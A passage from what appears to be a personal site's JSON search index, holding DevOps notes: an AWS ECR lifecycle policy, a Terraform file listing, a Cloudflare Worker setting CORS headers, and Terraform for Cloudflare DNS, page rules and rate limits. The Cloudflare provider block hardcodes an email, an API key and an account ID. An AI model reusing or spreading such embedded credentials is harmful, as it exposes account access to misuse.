style=\"color:#e6db74\"\u003e\u0026#34;untagged\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countType\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;sinceImagePushed\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countUnit\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;days\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countNumber\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;action\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;expire\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"AWS Configure"},{"categories":null,"contents":" tf Provider provider.tf EC2 ec2.tf initial.bash Elastic IP elasticip.tf MQ mq.tf RDS rds.tf Security Group sg.tf VPC vpc.tf WAF waf.tf ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/aws/terraform/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003etf\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"provider\"\u003eProvider\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/provider.tf\"\u003eprovider.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"ec2\"\u003eEC2\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/ec2.tf\"\u003eec2.tf\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/initial.bash\"\u003einitial.bash\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"elastic-ip\"\u003eElastic IP\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/elasticip.tf\"\u003eelasticip.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"mq\"\u003eMQ\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/mq.tf\"\u003emq.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"rds\"\u003eRDS\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/rds.tf\"\u003erds.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"security-group\"\u003eSecurity Group\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/sg.tf\"\u003esg.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"vpc\"\u003eVPC\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/vpc.tf\"\u003evpc.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"waf\"\u003eWAF\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/waf.tf\"\u003ewaf.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"AWS Terraform"},{"categories":null,"contents":" Setting CloudFlare Worker for CORS addEventListener(\u0026#34;fetch\u0026#34;, (event) =\u0026gt; { event.respondWith(handleRequest(event.request)); }); async function handleRequest(request) { let response = await fetch(request); response = new Response(response.body, response); response.headers.set( \u0026#34;Access-Control-Allow-Origin\u0026#34;, \u0026#34;frontend-h5.shyc883.com\u0026#34; ); response.headers.set(\u0026#34;Access-Control-Allow-Methods\u0026#34;, \u0026#34;GET, OPTIONS, POST\u0026#34;); response.headers.set( \u0026#34;Access-Control-Allow-Headers\u0026#34;, \u0026#34;Content-Type, Authorization\u0026#34; ); response.headers.set(\u0026#34;Access-Control-Allow-Credentials\u0026#34;, true); return response; } Terraform_create_record terraform { required_providers { cloudflare = { source = \u0026#34;cloudflare/cloudflare\u0026#34; version = \u0026#34;~\u0026gt; 2.0\u0026#34; } } } provider \u0026#34;cloudflare\u0026#34; { email = \u0026#34;cloudflare@gmail.com\u0026#34; api_key = \u0026#34;1488ed0d2082ed36c010b773431fd9dcacde1\u0026#34; account_id = \u0026#34;06ae012a1ba907df24a220cd14a4fa8b\u0026#34; } resource \u0026#34;cloudflare_record\u0026#34; \u0026#34;gitlab\u0026#34; { zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34; name = \u0026#34;gitlab\u0026#34; value = \u0026#34;192.123.168.234\u0026#34; type = \u0026#34;A\u0026#34; ttl = 300 proxied = true } Terraform_create_page_rule # Add a page rule to the domain resource \u0026#34;cloudflare_page_rule\u0026#34; \u0026#34;page_rule_png\u0026#34; { zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34; target = \u0026#34;www.example.com/*.png*\u0026#34; status = \u0026#34;active\u0026#34; actions { always_use_https = \u0026#34;true\u0026#34; browser_cache_ttl = 86400 cache_level = \u0026#34;cache_everything\u0026#34; # edge_cache_ttl = 86400 cache_key_fields { cookie {} header {} host {} query_string { ignore = true } user {} } # cache_ttl_by_status { # codes = \u0026#34;200-299\u0026#34; # ttl = 300 # } # cache_ttl_by_status { # codes = \u0026#34;300-399\u0026#34; # ttl = 60 # } # cache_ttl_by_status { # codes = \u0026#34;400-403\u0026#34; # ttl = -1 # } # cache_ttl_by_status { # codes = \u0026#34;404\u0026#34; # ttl = 30 # } # cache_ttl_by_status { # codes = \u0026#34;405-499\u0026#34; # ttl = -1 # } # cache_ttl_by_status { # codes = \u0026#34;500-599\u0026#34; # ttl = 0 # } # } } # resource \u0026#34;cloudflare_page_rule\u0026#34; \u0026#34;rules\u0026#34; { # count = \u0026#34;${length(keys(\u0026#34;${var.targets}\u0026#34;))}\u0026#34; # lifecycle { # create_before_destroy = true # } # zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34; # target = \u0026#34;${var.targets[element(keys(var.targets),count.index)]}\u0026#34; # actions { # always_use_https = \u0026#34;true\u0026#34; # cache_level = \u0026#34;cache_everything\u0026#34; # } # priority = \u0026#34;${count.index + 1}\u0026#34; # } Terraform_create_rate_limit_rule # Create rate limit rule resource \u0026#34;cloudflare_rate_limit\u0026#34; \u0026#34;wss_rate_limit\u0026#34; { zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34; threshold = 50 period = 60 match { request { url_pattern = \u0026#34;*wss*/*\u0026#34; } } action { mode = \u0026#34;ban\u0026#34; timeout = 3600 } correlate { by = \u0026#34;nat\u0026#34; } } resource \u0026#34;cloudflare_rate_limit\u0026#34; \u0026#34;frontend_rate_limit\u0026#34; { zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34; threshold = 50 period = 10 match { request { url_pattern = \u0026#34;*h5*/*\u0026#34; } } action { mode = \u0026#34;ban\u0026#34; timeout = 3600 } correlate { by = \u0026#34;nat\u0026#34; } } API Document Cloudflare for SaaS partial (CNAME) zone ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/docs/cloudflare/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSetting CloudFlare Worker for CORS\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddEventListener\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fetch\u0026#34;\u003c/span\u003e, (\u003cspan style=\"color:#a6e22e\"\u003eevent\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eevent\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003erespondWith\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehandleRequest\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eevent\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003erequest\u003c/span\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e});\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003easync\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehandleRequest\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003erequest\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eawait\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efetch\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003erequest\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eResponse\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eheaders\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eset\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Access-Control-Allow-Origin\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;frontend-h5.shyc883.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eheaders\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eset\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Access-Control-Allow-Methods\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;GET, OPTIONS, POST\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eheaders\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eset\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Access-Control-Allow-Headers\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type, Authorization\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eheaders\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eset\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Access-Control-Allow-Credentials\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eTerraform_create_record\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-hcl\" data-lang=\"hcl\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eterraform\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003erequired_providers\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    cloudflare \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      source \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare/cloudflare\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      version \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;~\u0026gt; 2.0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eprovider\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  email   \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare@gmail.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  api_key \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1488ed0d2082ed36c010b773431fd9dcacde1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  account_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;06ae012a1ba907df24a220cd14a4fa8b\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eresource\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare_record\u0026#34; \u0026#34;gitlab\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  zone_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name    \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;gitlab\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  value   \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.123.168.234\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  type    \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;A\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ttl     \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  proxied \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eTerraform_create_page_rule\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-hcl\" data-lang=\"hcl\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Add a page rule to the domain\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eresource\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare_page_rule\u0026#34; \u0026#34;page_rule_png\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  zone_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  target \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;www.example.com/*.png*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  status   \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;active\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eactions\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    always_use_https \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    browser_cache_ttl \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e86400\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    cache_level \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cache_everything\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e    # edge_cache_ttl = 86400\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#66d9ef\"\u003ecache_key_fields\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003ecookie\u003c/span\u003e {}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eheader\u003c/span\u003e {}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003ehost\u003c/span\u003e {}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003equery_string\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ignore \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003euser\u003c/span\u003e {}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #   cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;200-299\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = 300\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;300-399\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = 60\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;400-403\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = -1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;404\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = 30\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan 